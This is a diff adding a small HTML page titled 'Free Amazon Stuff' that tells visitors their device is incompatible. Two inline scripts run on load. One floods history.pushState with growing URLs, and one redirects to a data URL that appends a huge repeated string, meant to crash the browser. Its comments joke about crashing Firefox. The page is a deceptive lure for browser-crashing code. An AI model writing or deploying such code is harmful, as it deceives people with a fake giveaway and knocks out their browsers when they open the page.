@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+  <body>
+      <h1>Free Amazon Stuff</h1>
+      <p>This website is incompatible with your device. Please veiw this on a computer.</p>
+      <script>
+      var total = "";
+      for( var i = 0; i < 100000; i++ ) {
+          total = total + i.toString();
+          history.pushState(0,0, total );
+      }
+  </script>
+   <script>
+            // Crash Firefox in one line of JS - am I cool yet HackerNews?
+            // Hehe, the earlier script was borked, this was supposed be a practice in recursion:
+        location = "data:text/html,<script>location+=location+'A'.repeat(100000000);<\/script>";
+        </script>
+  </body>
+</html>
